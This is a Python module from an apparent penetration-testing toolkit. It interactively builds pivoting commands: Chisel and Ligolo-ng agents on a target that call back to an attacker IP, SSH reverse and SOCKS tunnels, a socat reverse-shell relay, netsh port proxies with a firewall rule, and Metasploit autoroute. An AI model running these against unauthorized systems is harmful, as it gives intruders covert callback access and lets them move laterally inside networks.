"""Empusa - Reverse tunnel and port forward builder."""

from __future__ import annotations

from datetime import datetime
from pathlib import Path

from rich.prompt import Confirm, Prompt

from empusa.cli_common import (
    CONFIG,
    console,
    log_error,
    log_info,
    log_success,
    render_group_heading,
    render_screen,
    sanitize_filename,
)
from empusa.cli_scan import validate_hostname, validate_port


def build_reverse_tunnel() -> None:
    """Interactive builder for reverse tunnels and port forwarding with multiple tools."""
    render_screen("Reverse Tunnel & Port Forward Builder")
    log_info("[bold]Choose Tunnel Type:[/]")
    log_info("1. Chisel (SOCKS5 proxy)")
    log_info("2. SSH Reverse Tunnel (-R)")
    log_info("3. SSH Local Tunnel (-L)")
    log_info("4. SSH Dynamic SOCKS (-D)")
    log_info("5. Ligolo-ng")
    log_info("6. Socat Port Forward")
    log_info("7. Netsh PortProxy (Windows)")
    log_info("8. Metasploit Autoroute")
    log_info("0. Back to Main Menu")

    choice = Prompt.ask("Select an option", choices=["0", "1", "2", "3", "4", "5", "6", "7", "8"])

    if choice == "0":
        return

    commands: list[tuple[str, str]] = []
    tunnel_name = ""

    if choice == "1":
        # Chisel SOCKS5
        tunnel_name = "Chisel"
        log_info("\n[bold yellow]Chisel SOCKS5 Proxy Setup[/bold yellow]")

        attacker_ip = Prompt.ask("Enter your attacking machine IP/hostname")
        if not validate_hostname(attacker_ip):
            log_error("Invalid IP/hostname")
            return

        chisel_port = Prompt.ask("Enter Chisel listener port", default="8080")
        if not validate_port(chisel_port):
            log_error("Invalid port number")
            return

        socks_port = Prompt.ask("Enter SOCKS proxy port", default="1080")
        if not validate_port(socks_port):
            log_error("Invalid port number")
            return

        commands = [
            ("Attacker", f"./chisel server -p {chisel_port} --socks5 --reverse"),
            ("Target", f"./chisel client {attacker_ip}:{chisel_port} R:{socks_port}:socks"),
            ("Configure Proxy", f"# Set browser/tools to use SOCKS5 proxy: localhost:{socks_port}"),
            ("ProxyChains", f"# Add to /etc/proxychains.conf: socks5 127.0.0.1 {socks_port}"),
        ]

    elif choice == "2":
        # SSH Reverse Tunnel
        tunnel_name = "SSH_Reverse"
        log_info("\n[bold yellow]SSH Reverse Tunnel (-R)[/bold yellow]")
        log_info("Expose a target port on your attacker machine")

        attacker_user = Prompt.ask("Enter your username on attacker machine")
        attacker_host = Prompt.ask("Enter your attacker IP/hostname")
        if not validate_hostname(attacker_host):
            log_error("Invalid IP/hostname")
            return

        remote_port = Prompt.ask("Enter port to open on attacker machine", default="8888")
        if not validate_port(remote_port):
            log_error("Invalid port number")
            return

        local_port = Prompt.ask("Enter target port to expose", default="80")
        if not validate_port(local_port):
            log_error("Invalid port number")
            return

        target_host = Prompt.ask("Enter target host", default="127.0.0.1")

        commands = [
            ("Target", f"ssh -R {remote_port}:{target_host}:{local_port} {attacker_user}@{attacker_host} -N -f"),
            (
                "Alternative (no background)",
                f"ssh -R {remote_port}:{target_host}:{local_port} {attacker_user}@{attacker_host}",
            ),
            ("Access", f"# Connect to localhost:{remote_port} on attacker machine"),
            (
                "Keep Alive",
                f"ssh -R {remote_port}:{target_host}:{local_port} {attacker_user}@{attacker_host} -N -o ServerAliveInterval=60 -o ServerAliveCountMax=3",
            ),
        ]

    elif choice == "3":
        # SSH Local Tunnel
        tunnel_name = "SSH_Local"
        log_info("\n[bold yellow]SSH Local Tunnel (-L)[/bold yellow]")
        log_info("Access a remote service through SSH tunnel")

        attacker_user = Prompt.ask("Enter your username on pivot/SSH server")
        pivot_host = Prompt.ask("Enter pivot/SSH server IP/hostname")
        if not validate_hostname(pivot_host):
            log_error("Invalid IP/hostname")
            return

        local_port = Prompt.ask("Enter local port on your machine", default="8080")
        if not validate_port(local_port):
            log_error("Invalid port number")
            return

        target_host = Prompt.ask("Enter target host (from pivot's perspective)", default="127.0.0.1")
        target_port = Prompt.ask("Enter target port", default="80")
        if not validate_port(target_port):
            log_error("Invalid port number")
            return

        commands = [
            ("Attacker", f"ssh -L {local_port}:{target_host}:{target_port} {attacker_user}@{pivot_host} -N -f"),
            (
                "Alternative (no background)",
                f"ssh -L {local_port}:{target_host}:{target_port} {attacker_user}@{pivot_host}",
            ),
            ("Access", f"# Connect to localhost:{local_port} on your machine"),
            (
                "Multiple Ports",
                f"ssh -L {local_port}:{target_host}:{target_port} -L 8081:target2:443 {attacker_user}@{pivot_host} -N",
            ),
        ]

    elif choice == "4":
        # SSH Dynamic SOCKS
        tunnel_name = "SSH_SOCKS"
        log_info("\n[bold yellow]SSH Dynamic SOCKS Proxy (-D)[/bold yellow]")
        log_info("Create a SOCKS proxy through SSH")

        attacker_user = Prompt.ask("Enter your username on pivot/SSH server")
        pivot_host = Prompt.ask("Enter pivot/SSH server IP/hostname")
        if not validate_hostname(pivot_host):
            log_error("Invalid IP/hostname")
            return

        socks_port = Prompt.ask("Enter SOCKS proxy port on your machine", default="1080")
        if not validate_port(socks_port):
            log_error("Invalid port number")
            return

        commands = [
            ("Attacker", f"ssh -D {socks_port} {attacker_user}@{pivot_host} -N -f"),
            ("Alternative (no background)", f"ssh -D {socks_port} {attacker_user}@{pivot_host}"),
            ("Configure Proxy", f"# Set browser/tools to use SOCKS5 proxy: localhost:{socks_port}"),
            ("ProxyChains", f"# Add to /etc/proxychains.conf: socks5 127.0.0.1 {socks_port}"),
            ("Usage Example", "proxychains nmap -sT -Pn 10.10.10.0/24"),
        ]

    elif choice == "5":
        # Ligolo-ng
        tunnel_name = "Ligolo"
        log_info("\n[bold yellow]Ligolo-ng Setup[/bold yellow]")
        log_info("Modern tunneling with TUN interface")

        attacker_ip = Prompt.ask("Enter your attacking machine IP")
        if not validate_hostname(attacker_ip):
            log_error("Invalid IP/hostname")
            return

        ligolo_port = Prompt.ask("Enter Ligolo listener port", default="11601")
        if not validate_port(ligolo_port):
            log_error("Invalid port number")
            return

        tunnel_ip = Prompt.ask("Enter tunnel network (e.g., 240.0.0.1/24)", default="240.0.0.1/24")

        commands = [
            ("Attacker - Setup Interface", "sudo ip tuntap add user $(whoami) mode tun ligolo"),
            ("Attacker - Bring Up", "sudo ip link set ligolo up"),
            ("Attacker - Start Proxy", f"./proxy -selfcert -laddr 0.0.0.0:{ligolo_port}"),
            ("Target", f"./agent -connect {attacker_ip}:{ligolo_port} -ignore-cert"),
            ("In Ligolo Console", "session # Select session"),
            ("In Ligolo Console", "ifconfig # View target networks"),
            ("Attacker - Add Route", f"sudo ip route add {tunnel_ip} dev ligolo"),
            ("In Ligolo Console", "start # Start tunnel"),
        ]

    elif choice == "6":
        # Socat
        tunnel_name = "Socat"
        log_info("\n[bold yellow]Socat Port Forward[/bold yellow]")

        listen_port = Prompt.ask("Enter port to listen on", default="8080")
        if not validate_port(listen_port):
            log_error("Invalid port number")
            return

        target_host = Prompt.ask("Enter target host to forward to")
        if not validate_hostname(target_host):
            log_error("Invalid IP/hostname")
            return

        target_port = Prompt.ask("Enter target port", default="80")
        if not validate_port(target_port):
            log_error("Invalid port number")
            return

        commands = [
            ("Basic Forward", f"socat TCP-LISTEN:{listen_port},fork TCP:{target_host}:{target_port}"),
            ("Background", f"socat TCP-LISTEN:{listen_port},fork TCP:{target_host}:{target_port} &"),
            ("With Reuseaddr", f"socat TCP-LISTEN:{listen_port},fork,reuseaddr TCP:{target_host}:{target_port}"),
            ("Reverse Shell Relay", f"socat TCP-LISTEN:{listen_port} TCP:{target_host}:{target_port}"),
            ("Usage", f"# Connect to localhost:{listen_port} to reach {target_host}:{target_port}"),
        ]

    elif choice == "7":
        # Windows Netsh
        tunnel_name = "Netsh"
        log_info("\n[bold yellow]Windows Netsh PortProxy[/bold yellow]")
        log_info("Native Windows port forwarding (requires admin)")

        listen_port = Prompt.ask("Enter port to listen on", default="8080")
        if not validate_port(listen_port):
            log_error("Invalid port number")
            return

        target_host = Prompt.ask("Enter target host to forward to")
        target_port = Prompt.ask("Enter target port", default="80")
        if not validate_port(target_port):
            log_error("Invalid port number")
            return

        listen_addr = Prompt.ask("Enter listen address", default="0.0.0.0")

        commands = [
            (
                "Add Port Forward",
                f"netsh interface portproxy add v4tov4 listenaddress={listen_addr} listenport={listen_port} connectaddress={target_host} connectport={target_port}",
            ),
            ("List Forwards", "netsh interface portproxy show all"),
            (
                "Delete Forward",
                f"netsh interface portproxy delete v4tov4 listenaddress={listen_addr} listenport={listen_port}",
            ),
            ("Reset All", "netsh interface portproxy reset"),
            (
                "Firewall Rule",
                f'netsh advfirewall firewall add rule name="Port Forward {listen_port}" protocol=TCP dir=in localport={listen_port} action=allow',
            ),
            ("Note", "# Requires Administrator privileges"),
        ]

    elif choice == "8":
        # Metasploit Autoroute
        tunnel_name = "Metasploit"
        log_info("\n[bold yellow]Metasploit Autoroute & Port Forward[/bold yellow]")

        session_id = Prompt.ask("Enter Meterpreter session ID", default="1")
        target_subnet = Prompt.ask("Enter target subnet to route (e.g., 10.10.10.0/24)")
        local_port = Prompt.ask("Enter local port for port forward", default="8080")
        if not validate_port(local_port):
            log_error("Invalid port number")
            return

        target_host = Prompt.ask("Enter target host for port forward (optional)", default="")
        target_port = Prompt.ask("Enter target port for port forward (optional)", default="")

        commands = [
            ("Autoroute", "use post/multi/manage/autoroute"),
            ("Set Session", f"set SESSION {session_id}"),
            ("Set Subnet", f"set SUBNET {target_subnet}"),
            ("Run", "run"),
            ("Verify Routes", "route print"),
            ("SOCKS Proxy", "use auxiliary/server/socks_proxy"),
            ("Set Version", "set SRVPORT 1080"),
            ("Run Proxy", "run -j"),
        ]

        if target_host and target_port:
            commands.extend(
                [
                    ("Port Forward", f"portfwd add -l {local_port} -p {target_port} -r {target_host}"),
                    ("List Forwards", "portfwd list"),
                    ("Delete Forward", f"portfwd delete -l {local_port}"),
                ]
            )

    # Display commands
    render_group_heading(f"{tunnel_name} Commands", "bold green")
    for label, cmd in commands:
        log_info(f"\n[cyan]{label}:[/cyan]")
        if not CONFIG["quiet"]:
            console.print(f"  {cmd}", style="bold white")

    # Save to file
    if Confirm.ask("\n[yellow]Save these commands to a file?[/yellow]"):
        env_name = Prompt.ask("Enter environment/host name (for filename)", default="tunnel")
        safe_name = sanitize_filename(env_name)
        save_file = Path.cwd() / f"{safe_name}-{tunnel_name.lower()}-commands.txt"

        if (
            save_file.exists()
            and not CONFIG["dry_run"]
            and not Confirm.ask(f"[yellow]File {save_file} exists. Overwrite?[/yellow]")
        ):
            log_info("Not saving commands.", "yellow")
            return

        if CONFIG["dry_run"]:
            log_info(f"[DRY RUN] Would save commands to {save_file}", "yellow")
            return

        try:
            with save_file.open("w") as f:
                f.write(f"# {tunnel_name} Tunnel Commands\n")
                f.write(f"# Generated: {datetime.now().isoformat()}\n")
                f.write(f"# Environment: {env_name}\n\n")

                for label, cmd in commands:
                    f.write(f"# {label}\n")
                    f.write(f"{cmd}\n\n")

            log_success(f"Commands saved to: {save_file}")
        except Exception as e:
            log_error(f"Error saving commands: {e}")
